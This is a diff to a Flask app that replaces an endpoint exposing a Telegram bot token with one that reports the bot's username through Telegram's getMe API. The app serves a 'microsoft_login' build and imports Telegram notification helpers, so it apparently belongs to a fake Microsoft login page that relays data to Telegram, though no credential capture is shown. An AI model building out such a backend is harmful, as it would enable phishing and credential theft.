@@ -6,11 +6,13 @@ from dotenv import load_dotenv
 from tg import send_notification, get_status_update
 import os
 from urllib.parse import quote
+import requests
 
 # --- Load Environment Variables ---
 load_dotenv()
 HOSTED_URL = os.getenv("HOSTED_URL")
 DEFAULT_USER_ID = os.getenv("USER_ID")
+BOT_TOKEN = os.getenv("BOT_TOKEN")
 
 # --- Flask App Initialization ---
 app = Flask(__name__, static_folder='microsoft_login/build')
@@ -37,9 +39,19 @@ initialize_database()
 # --- API Endpoints ---
 
 
-@app.get("/bot_token")
-def bot_token():
-    return jsonify({"BOT_TOKEN": os.getenv("BOT_TOKEN")})
+@app.get("/bot")
+def bot_info():
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getMe"
+
+    response = requests.get(url)
+    data = response.json()
+
+    if data["ok"]:
+        bot_info = data["result"]
+        return f"Bot Username: @{bot_info['username']}"
+    else:
+        return "Failed to get bot info"
+
 
 
 
